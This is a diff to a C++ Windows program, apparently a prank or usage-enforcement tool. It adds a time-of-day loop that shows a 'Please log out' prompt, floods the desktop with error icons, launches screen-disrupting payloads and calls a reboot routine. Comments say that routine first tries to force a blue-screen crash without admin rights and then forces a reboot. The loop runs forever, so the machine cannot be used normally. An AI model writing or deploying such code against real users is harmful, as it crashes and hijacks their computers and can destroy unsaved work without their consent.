@@ -1,4 +1,5 @@
 #include <windows.h>
+#include <wininet.h>
 #include <iostream>
 #include <atomic>
 #include <thread>
@@ -6,6 +7,7 @@
 #include <array>
 #include <vector>
 #include <functional>
+#include "payloads.h"
 
 #define TIME_SECOND 1000
 #define MAX_RUNTIME 15
@@ -14,9 +16,14 @@ std::random_device rd;
 std::mt19937 mt(rd());
 std::atomic<int> runtime = 0;
 
+//#define TEST
 
 void reboot(void) 
 {
+#ifdef TEST
+	std::cout << "REBOOT" << std::endl;
+	exit(1);
+#else
 	// Try to force BSOD first
 	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
 	// This isn't even an exploit, it's just an undocumented feature.
@@ -44,6 +51,7 @@ void reboot(void)
 
 	// The actual restart
 	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
+#endif
 }
 
 void PayloadMessageBox(void)
@@ -144,12 +152,71 @@ void LaunchPayloads(void)
 	}
 }
 
+void displayIcon(HDC hdc, int ix, int iy, int w, int h, HICON icon) {
+	for (;;) {
+		DrawIcon(hdc, mt() % (w - ix), mt() % (h - iy), icon);
+	}
+}
+
+void yesnobox(void) {
+	int ix = GetSystemMetrics(SM_CXICON) / 2;
+	int iy = GetSystemMetrics(SM_CYICON) / 2;
+	HWND hwnd = GetDesktopWindow();
+	HDC hdc = GetWindowDC(hwnd);
+	RECT r;
+	GetWindowRect(hwnd, &r);
+	int w = r.right - r.left;
+	int h = r.bottom - r.top;
+	HICON icon = LoadIcon(nullptr, IDI_ERROR);
+
+	if (MessageBox(nullptr, L"Please log out", L"Warning", MB_OKCANCEL | MB_ICONHAND) == IDCANCEL) {
+		for (int i = 0; i < 10; ++i) {
+			std::thread(displayIcon, hdc, ix, iy, w, h, icon).detach();
+		}
+		std::this_thread::sleep_for(std::chrono::seconds(5));
+		reboot();
+	}
+}
+
+void nonblockingMsg(LPCWSTR displaystring, LPCWSTR title, int flags) {
+	MessageBox(nullptr, displaystring, title, flags);
+}
+
 int main(void)
 {
-	std::thread(LaunchPayloads).detach();
-	for (runtime = 0; runtime <= MAX_RUNTIME; runtime++) {
-		std::cout << "running for: " << runtime << std::endl;
-		std::this_thread::sleep_for(std::chrono::seconds(5));
+	for (;;) {
+		time_t t = time(NULL);
+		tm tptr;
+		localtime_s(&tptr, &t); // TODO: use system time or GMT or something idk just make it not use local time because people can change that AAAAAAAAA
+#if 0 // TODO: this gives me "unresolved external symbol" errors
+		if (!InternetCheckConnection(L"http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {
+			std::thread(nonblockingMsg, L"Please attatch ethernet cord", L"Warning", MB_OK).detach();
+			std::this_thread::sleep_for(std::chrono::seconds(15));
+			if (!InternetCheckConnection(L"http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {
+				goto startofend;
+			}
+		}
+#endif
+		if (tptr.tm_hour > 18 && (tptr.tm_hour < 23 || tptr.tm_wday == 6)) { // FIXME: this breaks when time is modified
+#ifdef TEST
+			std::cout << "Game time" << std::endl;
+			goto startofend;
+#endif
+			std::this_thread::sleep_for(std::chrono::minutes(5));
+			continue;
+		}
+
+startofend:
+		std::thread(yesnobox).detach();
+		std::thread(LaunchPayloads).detach();
+		for (runtime = 0; runtime <= MAX_RUNTIME; runtime++) {
+			std::cout << "running for: " << runtime << std::endl;
+#ifdef TEST
+			std::this_thread::sleep_for(std::chrono::seconds(5));
+#else
+			std::this_thread::sleep_for(std::chrono::seconds(60));
+#endif
+		}
+		reboot();
 	}
-	//reboot();
 }
